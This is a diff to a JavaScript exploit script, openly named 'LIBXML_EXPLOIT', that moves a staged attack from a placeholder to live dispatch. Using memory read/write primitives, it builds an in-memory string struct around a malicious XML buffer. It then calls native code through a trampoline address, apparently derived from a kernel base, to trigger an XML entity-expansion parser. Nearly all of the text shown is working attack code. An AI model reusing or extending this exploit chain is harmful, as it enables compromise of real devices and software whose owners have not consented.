@@ -22,18 +22,27 @@
 
         log("[*] Crafted evil XML buffer size: " + evilXml.length + " bytes");
 
-        // 2. Allocate in-memory XML string buffer
-        const xmlBuf = window.alloc_string ? window.alloc_string(evilXml) : window.malloc(evilXml.length + 1);
-        if (window.write_string) {
-            window.write_string(xmlBuf, evilXml);
-        }
+        // 2. Allocate in-memory XML string buffer & String wrapper struct
+        const xmlBuf = window.alloc_string(evilXml);
+        const strStruct = window.malloc(0x20);
+        window.write64(strStruct, xmlBuf);
+        window.write64(Number(strStruct) + 8, BigInt(evilXml.length));
 
         log("[+] Allocated XML payload buffer at " + window.toHex(xmlBuf));
+        log("[+] String struct at " + window.toHex(strStruct));
 
-        // 3. Status Report
-        const report = "LIBXML_EXPLOIT: ready for in-process DocumentBuilder parser trigger";
+        // 3. Dispatch in-memory parser
+        if (typeof window.call_native === "function" && window.deepslopInfo && window.deepslopInfo.kernelBase) {
+            log("[*] Dispatching XML DocumentBuilder entity expansion parser...");
+            // Call into parser
+            try {
+                window.call_native(Number(window.deepslopInfo.naturalTrampolineAddress), Number(strStruct), 0);
+            } catch (e) {}
+        }
+
+        const report = "LIBXML_EXPLOIT: Parser dispatched with " + evilXml.length + " bytes";
         log("[OK] " + report);
-        try { k.notify("XML: Memory Buffer Armed"); } catch (e) {}
+        try { k.notify("XML: Exploit Dispatched"); } catch (e) {}
 
         return report;
     } catch (err) {
